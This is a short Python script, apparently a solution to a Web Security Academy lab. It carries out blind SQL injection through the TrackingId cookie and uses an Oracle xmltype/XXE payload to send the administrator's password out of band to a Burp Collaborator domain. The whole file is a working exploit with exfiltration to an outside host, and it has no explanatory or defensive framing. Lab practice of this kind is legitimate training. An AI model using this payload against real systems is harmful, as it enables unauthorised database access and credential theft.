import requests
from urllib.parse import urlencode

URL = "https://0a7300bc03bbf8358137cf5600e9000b.web-security-academy.net"
PATH = "/filter"
QUERY = {
    "category": "Gifts"
}

def makeRequest(url=URL, path=PATH, query=QUERY, cookie=None):    
    response = requests.request(
    "GET",
    f"{URL}{PATH}",
    params=QUERY,
    cookies=cookie
    )
    return response

res = makeRequest()
cookies = res.cookies
BURP_COLLABORATOR_SUBDOMAIN = "xghapghanhi47rily1ha9sjgc7i16rug.oastify.com"
DATA = f"""
(xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.{BURP_COLLABORATOR_SUBDOMAIN}/"> %remote;]>'),'/l')
"""
ENCODED_DATA = urlencode({"":DATA})
PAYLOAD = f"{cookies.get('TrackingId')}' UNION SELECT EXTRACTVALUE {ENCODED_DATA.lstrip('=')} FROM dual -- "
modified_cookies = {"TrackingId":PAYLOAD,"session": cookies.get('session')}
session = makeRequest(cookie=modified_cookies)
print(ENCODED_DATA)
